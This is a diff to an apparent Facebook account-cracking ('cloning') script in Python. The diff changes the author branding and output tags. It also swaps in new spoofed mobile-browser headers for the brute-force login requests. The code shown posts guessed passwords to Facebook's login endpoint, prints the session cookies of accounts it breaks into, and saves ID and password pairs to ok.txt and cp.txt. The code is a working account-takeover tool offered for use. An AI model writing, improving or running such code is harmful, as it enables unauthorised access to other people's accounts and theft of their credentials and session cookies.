@@ -40,9 +40,9 @@ logo = """
 \033[1;33m   
 \033[1;37m •❀.•❤•.¸ 𝓐𝓵𝓲 ¸.•❤•.❀•
 \033[1;32m     
-\033[1;33m 
-\033[1;37m    
-\033[1;32m    
+\033[1;33m •❀.•❤•.¸ 𝓐𝓵𝓲 ¸.•❤•.❀•
+\033[1;37m •❀.•❤•.¸ 𝓐𝓵𝓲 ¸.•❤•.❀•
+\033[1;32m •❀.•❤•.¸ 𝓐𝓵𝓲 ¸.•❤•.❀•
 \033[1;93m--------------------------------------------------
 \033[1;32m [+] Author  : Veer Ali 
 \033[1;32m [+] Version : 0.5
@@ -142,7 +142,7 @@ def method1():
 		print("\033[92;1m Brute Has Been Started \x1b[0m")
 		print("\033[92;1m To Stop Process Press CTRL + Z\033[93;1m")
 		print(50*'\033[92;1m-')
-		print(" [\033[1;92m\033[1;41m  Use Airplane mode For Speedup Cloning  \033[0m\033[1;93m]")
+		print(" [\033[1;92m\033[1;41m  Use JHAAZ 🤣 mode For Speedup Cloning  \033[0m\033[1;93m]")
 		print(50*'\033[92;1m-')
 		print ("")
 		for guru in user:
@@ -181,23 +181,21 @@ def mcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority':"p.facebook.com",
-			'method':'GET',
-			'path':'/?tbua=1',
-			'scheme':'https',
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-			'accept-encoding': 'gzip, deflate, br',
-			'accept-language': 'en-US,en;q=0.9',
-			'cache-control': 'max-age=0',
-			'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"', 
-			'sec-ch-ua-mobile': '?0',
-			'sec-ch-ua-platform': '"Android"',
-			"sec-fetch-dest": "document",
-			'sec-fetch-mode': 'navigate',
-			'sec-fetch-site': 'same-origin',
-			'upgrade-insecure-requests': '1',
-			"sec-fetch-user": "?1",
-			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',}
+			header_freefb = {'authority': 'mbasic.facebook.com',
+    'method': 'POST',
+	'scheme': 'https',  
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+    'referer': 'https://www.google.com/',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'cross-site',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
 			lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
@@ -205,7 +203,7 @@ def mcrack(uid,pwx,tl):
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				coki1 = coki.split("1000")[1]
 				cid = "1000"+coki1[0:11]
-				print('\33[1;92m[QADIR-OK] '+cid+' | '+ps+'\33[0;97m')
+				print('\33[1;92m[VEER-OK] '+cid+' | '+ps+'\33[0;97m')
 				print("\033[1;92m[•] Cookie: "+coki)
 				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
 				ok.append(cid)
@@ -214,7 +212,7 @@ def mcrack(uid,pwx,tl):
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				coki1 = coki.split("1000")[1]
 				cid = "1000"+coki1[0:11]
-				print('\33[1;93m[QADIR-CP] '+cid+' | '+ps+'\33[0;97m')
+				print('\33[1;93m[VEER-CP] '+cid+' | '+ps+'\33[0;97m')
 				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
 				cp.append(cid)
 				break
